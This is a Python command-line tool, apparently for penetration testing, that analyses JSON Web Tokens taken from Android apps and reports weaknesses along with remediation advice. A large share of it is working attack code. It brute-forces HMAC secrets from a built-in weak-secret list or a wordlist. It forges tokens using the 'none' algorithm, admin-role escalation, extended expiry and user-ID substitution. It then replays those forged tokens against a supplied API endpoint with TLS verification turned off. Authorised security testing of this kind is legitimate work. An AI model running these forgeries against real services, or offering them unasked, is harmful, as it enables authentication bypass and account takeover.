#!/usr/bin/env python3
"""
JWT Analyzer for Android Security Testing

This script provides comprehensive analysis of JSON Web Tokens (JWTs) found in Android
applications, including vulnerability detection, token manipulation, and security testing.
"""

try:
    import jwt
except (KeyboardInterrupt, SystemExit):
    raise
except BaseException:  # pragma: no cover - optional/broken runtime dependency (e.g. missing cffi backend)
    jwt = None
import json
import base64
import hashlib
import hmac
import argparse
import sys
import time
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any
import requests
from urllib3.exceptions import InsecureRequestWarning
import threading

# Disable SSL warnings for testing
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class JWTAnalyzer:
    def __init__(self, token: str = None):
        self.token = token
        self.header = None
        self.payload = None
        self.signature = None
        self.vulnerabilities = []
        self.analysis_results = {}
        
        # Common weak secrets for brute force
        self.weak_secrets = [
            'secret', 'password', '123456', 'qwerty', 'admin', 'key',
            'jwt_secret', 'your-256-bit-secret', 'secret_key', 'mysecret',
            'test', 'demo', 'development', 'dev', 'production', 'prod',
            'app_secret', 'token_secret', 'api_secret', 'default',
            'changeme', 'please_change_me', 'insecure', 'weak'
        ]
        
        # Algorithm vulnerability mapping
        self.algorithm_risks = {
            'none': 'Critical - No signature verification',
            'HS256': 'Medium - Symmetric key, brute force possible',
            'HS384': 'Medium - Symmetric key, brute force possible',
            'HS512': 'Medium - Symmetric key, brute force possible',
            'RS256': 'Low - Asymmetric key, generally secure',
            'RS384': 'Low - Asymmetric key, generally secure',
            'RS512': 'Low - Asymmetric key, generally secure',
            'ES256': 'Low - Elliptic curve, generally secure',
            'ES384': 'Low - Elliptic curve, generally secure',
            'ES512': 'Low - Elliptic curve, generally secure'
        }
        
        if token:
            self.parse_token()
    
    def parse_token(self) -> bool:
        """Parse JWT token into components"""
        try:
            # Split token into parts
            parts = self.token.split('.')
            if len(parts) != 3:
                raise ValueError("Invalid JWT format - must have 3 parts separated by dots")
            
            # Decode header
            header_data = self._decode_base64url(parts[0])
            self.header = json.loads(header_data)
            
            # Decode payload
            payload_data = self._decode_base64url(parts[1])
            self.payload = json.loads(payload_data)
            
            # Store signature
            self.signature = parts[2]
            
            print(f"[+] JWT parsed successfully")
            print(f"    Algorithm: {self.header.get('alg', 'Unknown')}")
            print(f"    Type: {self.header.get('typ', 'Unknown')}")
            
            return True
            
        except Exception as e:
            print(f"[-] Failed to parse JWT: {e}")
            return False
    
    def _decode_base64url(self, data: str) -> str:
        """Decode base64url encoded data"""
        # Add padding if needed
        padded = data + '=' * (4 - len(data) % 4)
        
        # Replace URL-safe characters
        padded = padded.replace('-', '+').replace('_', '/')
        
        try:
            decoded = base64.b64decode(padded)
            return decoded.decode('utf-8')
        except Exception as e:
            raise ValueError(f"Invalid base64url encoding: {e}")
    
    def _encode_base64url(self, data: str) -> str:
        """Encode data as base64url"""
        encoded = base64.urlsafe_b64encode(data.encode('utf-8')).decode('utf-8')
        return encoded.rstrip('=')  # Remove padding
    
    def analyze_vulnerabilities(self) -> List[Dict]:
        """Analyze JWT for security vulnerabilities"""
        print("[+] Analyzing JWT vulnerabilities...")
        
        if not self.header or not self.payload:
            print("[-] No token data to analyze")
            return []
        
        self.vulnerabilities = []
        
        # Check for algorithm vulnerabilities
        self._check_algorithm_vulnerabilities()
        
        # Check for weak secrets (HMAC only)
        self._check_weak_secrets()
        
        # Check for expiration issues
        self._check_expiration_vulnerabilities()
        
        # Check for sensitive data exposure
        self._check_sensitive_data_exposure()
        
        # Check for common security issues
        self._check_common_vulnerabilities()
        
        # Check for algorithm confusion attacks
        self._check_algorithm_confusion()
        
        print(f"[+] Found {len(self.vulnerabilities)} potential vulnerabilities")
        
        return self.vulnerabilities
    
    def _check_algorithm_vulnerabilities(self):
        """Check for algorithm-specific vulnerabilities"""
        alg = self.header.get('alg', '').upper()
        
        if alg == 'NONE':
            self._add_vulnerability(
                'None Algorithm',
                'Critical',
                'JWT uses "none" algorithm - signature verification is bypassed',
                'Change algorithm to a secure option like RS256 or HS256',
                {'algorithm': alg, 'exploitable': True}
            )
        
        elif alg.startswith('HS'):
            self._add_vulnerability(
                'HMAC Algorithm',
                'Medium',
                f'JWT uses HMAC algorithm ({alg}) - vulnerable to brute force attacks',
                'Use asymmetric algorithms like RS256 or ensure strong secret keys',
                {'algorithm': alg, 'symmetric': True}
            )
        
        elif alg not in self.algorithm_risks:
            self._add_vulnerability(
                'Unknown Algorithm',
                'High',
                f'JWT uses unknown or unsupported algorithm: {alg}',
                'Use standard, well-tested algorithms like RS256',
                {'algorithm': alg, 'unknown': True}
            )
    
    def _check_weak_secrets(self):
        """Check for weak HMAC secrets"""
        alg = self.header.get('alg', '').upper()
        
        if not alg.startswith('HS'):
            return
        
        print("[+] Testing for weak HMAC secrets...")
        
        found_secret = None
        for secret in self.weak_secrets:
            if self._verify_hmac_secret(secret):
                found_secret = secret
                break
        
        if found_secret:
            self._add_vulnerability(
                'Weak HMAC Secret',
                'Critical',
                f'JWT uses weak secret key: "{found_secret}"',
                'Use a strong, randomly generated secret key (at least 256 bits)',
                {'secret': found_secret, 'algorithm': alg, 'exploitable': True}
            )
        else:
            print("    No weak secrets found in common list")
    
    def _verify_hmac_secret(self, secret: str) -> bool:
        """Verify if the given secret is correct for HMAC"""
        try:
            algorithm = self.header.get('alg', 'HS256')
            
            # Create test token with same header and payload
            test_token = jwt.encode(
                self.payload,
                secret,
                algorithm=algorithm,
                headers=self.header
            )
            
            # Compare signatures
            test_parts = test_token.split('.')
            original_parts = self.token.split('.')
            
            return test_parts[2] == original_parts[2]
            
        except Exception:
            return False
    
    def _check_expiration_vulnerabilities(self):
        """Check for expiration-related vulnerabilities"""
        exp = self.payload.get('exp')
        iat = self.payload.get('iat')
        nbf = self.payload.get('nbf')
        
        current_time = int(time.time())
        
        if exp is None:
            self._add_vulnerability(
                'No Expiration',
                'Medium',
                'JWT does not have an expiration time (exp claim)',
                'Add expiration time to prevent indefinite token usage',
                {'missing_claim': 'exp'}
            )
        else:
            if current_time > exp:
                self._add_vulnerability(
                    'Expired Token',
                    'Medium',
                    f'JWT is expired (expired at {datetime.fromtimestamp(exp)})',
                    'Token should be refreshed or renewed',
                    {'exp': exp, 'current_time': current_time}
                )
            
            # Check for very long expiration times
            if exp - current_time > 365 * 24 * 60 * 60:  # More than 1 year
                self._add_vulnerability(
                    'Excessive Expiration Time',
                    'Low',
                    'JWT has an expiration time longer than 1 year',
                    'Use shorter expiration times for better security',
                    {'exp': exp, 'years_valid': (exp - current_time) / (365 * 24 * 60 * 60)}
                )
        
        if iat and iat > current_time:
            self._add_vulnerability(
                'Future Issued Time',
                'Medium',
                'JWT issued time is in the future',
                'Verify system clock synchronization',
                {'iat': iat, 'current_time': current_time}
            )
        
        if nbf and nbf > current_time:
            self._add_vulnerability(
                'Not Yet Valid',
                'Low',
                'JWT is not yet valid (nbf claim)',
                'Token cannot be used until the specified time',
                {'nbf': nbf, 'current_time': current_time}
            )
    
    def _check_sensitive_data_exposure(self):
        """Check for sensitive data in JWT payload"""
        sensitive_fields = [
            'password', 'pwd', 'passwd', 'secret', 'key', 'token',
            'ssn', 'social_security', 'credit_card', 'cc_number',
            'cvv', 'pin', 'private_key', 'api_key', 'access_token'
        ]
        
        for field_name, field_value in self.payload.items():
            field_name_lower = field_name.lower()
            
            for sensitive in sensitive_fields:
                if sensitive in field_name_lower:
                    self._add_vulnerability(
                        'Sensitive Data Exposure',
                        'High',
                        f'Potentially sensitive field "{field_name}" found in JWT payload',
                        'Remove sensitive data from JWT payload or encrypt the entire token',
                        {'field': field_name, 'sensitive_type': sensitive}
                    )
                    break
    
    def _check_common_vulnerabilities(self):
        """Check for common JWT vulnerabilities"""
        # Check for missing key ID
        if 'kid' not in self.header:
            self._add_vulnerability(
                'Missing Key ID',
                'Low',
                'JWT header does not contain key ID (kid) claim',
                'Include key ID to help with key rotation and management',
                {'missing_claim': 'kid'}
            )
        
        # Check for critical claims
        critical = self.header.get('crit', [])
        if critical:
            self._add_vulnerability(
                'Critical Claims',
                'Medium',
                f'JWT uses critical claims: {critical}',
                'Ensure critical claims are properly validated',
                {'critical_claims': critical}
            )
        
        # Check for large payload
        payload_size = len(json.dumps(self.payload))
        if payload_size > 8192:  # 8KB
            self._add_vulnerability(
                'Large Payload',
                'Low',
                f'JWT payload is large ({payload_size} bytes)',
                'Consider reducing payload size for better performance',
                {'payload_size': payload_size}
            )
    
    def _check_algorithm_confusion(self):
        """Check for algorithm confusion vulnerabilities"""
        alg = self.header.get('alg', '').upper()
        
        if alg.startswith('RS'):
            # RSA algorithms might be vulnerable to algorithm confusion
            self._add_vulnerability(
                'Potential Algorithm Confusion',
                'Medium',
                f'RSA algorithm ({alg}) may be vulnerable to algorithm confusion attacks',
                'Ensure server strictly validates the algorithm and does not accept HMAC with RSA public key',
                {'algorithm': alg, 'attack_type': 'algorithm_confusion'}
            )
    
    def _add_vulnerability(self, vuln_type: str, severity: str, description: str, 
                          recommendation: str, metadata: Dict = None):
        """Add a vulnerability to the list"""
        vulnerability = {
            'type': vuln_type,
            'severity': severity,
            'description': description,
            'recommendation': recommendation,
            'metadata': metadata or {}
        }
        self.vulnerabilities.append(vulnerability)
    
    def create_forged_tokens(self) -> Dict[str, str]:
        """Create forged tokens for testing"""
        print("[+] Creating forged tokens for testing...")
        
        forged_tokens = {}
        
        # None algorithm attack
        forged_tokens['none_algorithm'] = self._create_none_algorithm_token()
        
        # Role escalation
        forged_tokens['admin_role'] = self._create_admin_role_token()
        
        # Extended expiration
        forged_tokens['extended_expiry'] = self._create_extended_expiry_token()
        
        # User ID manipulation
        forged_tokens['user_id_manipulation'] = self._create_user_id_token()
        
        return forged_tokens
    
    def _create_none_algorithm_token(self) -> str:
        """Create token with 'none' algorithm"""
        try:
            # Modify header
            forged_header = self.header.copy()
            forged_header['alg'] = 'none'
            
            # Modify payload for privilege escalation
            forged_payload = self.payload.copy()
            if 'role' in forged_payload:
                forged_payload['role'] = 'admin'
            if 'admin' in forged_payload:
                forged_payload['admin'] = True
            if 'permissions' in forged_payload:
                forged_payload['permissions'] = ['*']
            
            # Encode header and payload
            header_encoded = self._encode_base64url(json.dumps(forged_header))
            payload_encoded = self._encode_base64url(json.dumps(forged_payload))
            
            # Create token with empty signature
            forged_token = f"{header_encoded}.{payload_encoded}."
            
            return forged_token
            
        except Exception as e:
            print(f"[-] Failed to create 'none' algorithm token: {e}")
            return ""
    
    def _create_admin_role_token(self) -> str:
        """Create token with admin role"""
        try:
            # Check if we have a weak secret
            weak_secret = None
            for vuln in self.vulnerabilities:
                if vuln['type'] == 'Weak HMAC Secret':
                    weak_secret = vuln['metadata']['secret']
                    break
            
            if not weak_secret:
                print("[-] No weak secret found, cannot create admin role token")
                return ""
            
            # Modify payload
            forged_payload = self.payload.copy()
            forged_payload['role'] = 'admin'
            forged_payload['admin'] = True
            if 'permissions' in forged_payload:
                forged_payload['permissions'] = ['read', 'write', 'delete', 'admin']
            
            # Create forged token
            algorithm = self.header.get('alg', 'HS256')
            forged_token = jwt.encode(forged_payload, weak_secret, algorithm=algorithm)
            
            return forged_token
            
        except Exception as e:
            print(f"[-] Failed to create admin role token: {e}")
            return ""
    
    def _create_extended_expiry_token(self) -> str:
        """Create token with extended expiration"""
        try:
            # Check if we have a weak secret
            weak_secret = None
            for vuln in self.vulnerabilities:
                if vuln['type'] == 'Weak HMAC Secret':
                    weak_secret = vuln['metadata']['secret']
                    break
            
            if not weak_secret:
                return ""
            
            # Extend expiration by 1 year
            forged_payload = self.payload.copy()
            current_time = int(time.time())
            forged_payload['exp'] = current_time + (365 * 24 * 60 * 60)
            
            # Create forged token
            algorithm = self.header.get('alg', 'HS256')
            forged_token = jwt.encode(forged_payload, weak_secret, algorithm=algorithm)
            
            return forged_token
            
        except Exception as e:
            print(f"[-] Failed to create extended expiry token: {e}")
            return ""
    
    def _create_user_id_token(self) -> str:
        """Create token with different user ID"""
        try:
            # Check if we have a weak secret
            weak_secret = None
            for vuln in self.vulnerabilities:
                if vuln['type'] == 'Weak HMAC Secret':
                    weak_secret = vuln['metadata']['secret']
                    break
            
            if not weak_secret:
                return ""
            
            # Modify user ID
            forged_payload = self.payload.copy()
            
            # Try different user ID fields
            user_fields = ['user_id', 'uid', 'sub', 'user', 'id']
            for field in user_fields:
                if field in forged_payload:
                    if isinstance(forged_payload[field], int):
                        forged_payload[field] = 1  # Admin user ID
                    else:
                        forged_payload[field] = 'admin'
                    break
            
            # Create forged token
            algorithm = self.header.get('alg', 'HS256')
            forged_token = jwt.encode(forged_payload, weak_secret, algorithm=algorithm)
            
            return forged_token
            
        except Exception as e:
            print(f"[-] Failed to create user ID token: {e}")
            return ""
    
    def brute_force_secret(self, wordlist_file: str = None, max_attempts: int = 10000) -> Optional[str]:
        """Brute force HMAC secret"""
        if not self.header.get('alg', '').startswith('HS'):
            print("[-] Brute force only works with HMAC algorithms")
            return None
        
        print(f"[+] Brute forcing JWT secret...")
        
        secrets_to_try = self.weak_secrets.copy()
        
        # Add wordlist if provided
        if wordlist_file:
            try:
                with open(wordlist_file, 'r') as f:
                    wordlist_secrets = [line.strip() for line in f if line.strip()]
                    secrets_to_try.extend(wordlist_secrets)
            except FileNotFoundError:
                print(f"[-] Wordlist file not found: {wordlist_file}")
        
        # Limit attempts
        secrets_to_try = secrets_to_try[:max_attempts]
        
        print(f"[+] Testing {len(secrets_to_try)} potential secrets...")
        
        for i, secret in enumerate(secrets_to_try):
            if i % 100 == 0 and i > 0:
                print(f"    Tested {i} secrets...")
            
            if self._verify_hmac_secret(secret):
                print(f"[+] SECRET FOUND: {secret}")
                return secret
        
        print("[-] Secret not found")
        return None
    
    def test_token_against_api(self, api_url: str, headers: Dict = None) -> Dict:
        """Test JWT token against an API endpoint"""
        print(f"[+] Testing token against API: {api_url}")
        
        test_headers = headers or {}
        test_headers['Authorization'] = f'Bearer {self.token}'
        test_headers['Content-Type'] = 'application/json'
        
        results = {}
        
        try:
            # Test original token
            response = requests.get(api_url, headers=test_headers, verify=False, timeout=10)
            results['original_token'] = {
                'status_code': response.status_code,
                'response_length': len(response.content),
                'success': response.status_code < 400
            }
            
            # Test forged tokens if vulnerabilities exist
            forged_tokens = self.create_forged_tokens()
            
            for token_type, forged_token in forged_tokens.items():
                if forged_token:
                    test_headers['Authorization'] = f'Bearer {forged_token}'
                    
                    try:
                        response = requests.get(api_url, headers=test_headers, verify=False, timeout=10)
                        results[token_type] = {
                            'status_code': response.status_code,
                            'response_length': len(response.content),
                            'success': response.status_code < 400,
                            'token': forged_token[:50] + '...'
                        }
                    except Exception as e:
                        results[token_type] = {'error': str(e)}
            
        except Exception as e:
            results['error'] = str(e)
        
        return results
    
    def generate_report(self) -> Dict:
        """Generate comprehensive analysis report"""
        report = {
            'token': self.token,
            'header': self.header,
            'payload': self.payload,
            'signature': self.signature,
            'analysis_time': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'risk_score': self._calculate_risk_score(),
            'forged_tokens': {},
            'recommendations': self._generate_recommendations()
        }
        
        # Add forged tokens if vulnerabilities exist
        if any(v['metadata'].get('exploitable', False) for v in self.vulnerabilities):
            report['forged_tokens'] = self.create_forged_tokens()
        
        return report
    
    def _calculate_risk_score(self) -> int:
        """Calculate overall risk score (0-10)"""
        score = 0
        
        severity_weights = {
            'Critical': 4,
            'High': 3,
            'Medium': 2,
            'Low': 1
        }
        
        for vuln in self.vulnerabilities:
            severity = vuln.get('severity', 'Low')
            score += severity_weights.get(severity, 1)
        
        return min(score, 10)  # Cap at 10
    
    def _generate_recommendations(self) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        # General recommendations
        recommendations.append("Use strong, randomly generated secret keys for HMAC algorithms")
        recommendations.append("Implement proper token expiration and refresh mechanisms")
        recommendations.append("Validate JWT algorithm on the server side")
        recommendations.append("Avoid storing sensitive data in JWT payload")
        recommendations.append("Use HTTPS for all JWT transmission")
        
        # Specific recommendations based on vulnerabilities
        for vuln in self.vulnerabilities:
            if vuln['type'] == 'None Algorithm':
                recommendations.append("Never accept 'none' algorithm in production")
            elif vuln['type'] == 'Weak HMAC Secret':
                recommendations.append("Replace weak secret with cryptographically strong key")
            elif vuln['type'] == 'No Expiration':
                recommendations.append("Add appropriate expiration time to all tokens")
        
        return list(set(recommendations))  # Remove duplicates


def main():
    parser = argparse.ArgumentParser(description='JWT Security Analyzer')
    parser.add_argument('token', nargs='?', help='JWT token to analyze')
    parser.add_argument('-f', '--file', help='File containing JWT token')
    parser.add_argument('-w', '--wordlist', help='Wordlist file for brute force attack')
    parser.add_argument('-t', '--test-api', help='API endpoint to test token against')
    parser.add_argument('-o', '--output', help='Output file for analysis report')
    parser.add_argument('--brute-force', action='store_true', help='Attempt to brute force HMAC secret')
    parser.add_argument('--max-attempts', type=int, default=10000, help='Maximum brute force attempts')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()

    if jwt is None:
        print("[-] The 'PyJWT' package is not installed. Install it with: pip install PyJWT cryptography")
        sys.exit(1)

    # Get token from argument or file
    token = None
    if args.token:
        token = args.token
    elif args.file:
        try:
            with open(args.file, 'r') as f:
                token = f.read().strip()
        except FileNotFoundError:
            print(f"[-] Token file not found: {args.file}")
            sys.exit(1)
    else:
        print("[-] No JWT token provided")
        parser.print_help()
        sys.exit(1)
    
    try:
        # Create analyzer
        analyzer = JWTAnalyzer(token)
        
        if not analyzer.header:
            print("[-] Failed to parse JWT token")
            sys.exit(1)
        
        # Analyze vulnerabilities
        vulnerabilities = analyzer.analyze_vulnerabilities()
        
        # Brute force if requested
        if args.brute_force:
            secret = analyzer.brute_force_secret(args.wordlist, args.max_attempts)
            if secret:
                print(f"[+] Found secret: {secret}")
        
        # Test against API if provided
        if args.test_api:
            api_results = analyzer.test_token_against_api(args.test_api)
            print(f"\n[+] API Test Results:")
            for test_type, result in api_results.items():
                if 'error' in result:
                    print(f"    {test_type}: Error - {result['error']}")
                else:
                    status = "SUCCESS" if result['success'] else "FAILED"
                    print(f"    {test_type}: {status} (HTTP {result['status_code']})")
        
        # Generate report
        report = analyzer.generate_report()
        
        # Save report if output file specified
        if args.output:
            with open(args.output, 'w') as f:
                json.dump(report, f, indent=2)
            print(f"\n[+] Report saved to {args.output}")
        
        # Print summary
        print(f"\n[+] Analysis Summary:")
        print(f"    Algorithm: {analyzer.header.get('alg', 'Unknown')}")
        print(f"    Vulnerabilities: {len(vulnerabilities)}")
        print(f"    Risk Score: {report['risk_score']}/10")
        
        if vulnerabilities:
            print(f"\n[+] Vulnerabilities found:")
            for vuln in vulnerabilities:
                print(f"    [{vuln['severity']}] {vuln['type']}: {vuln['description']}")
        
        if args.verbose and report['forged_tokens']:
            print(f"\n[+] Forged tokens created:")
            for token_type, forged_token in report['forged_tokens'].items():
                if forged_token:
                    print(f"    {token_type}: {forged_token[:50]}...")
        
    except Exception as e:
        print(f"[-] Analysis failed: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()
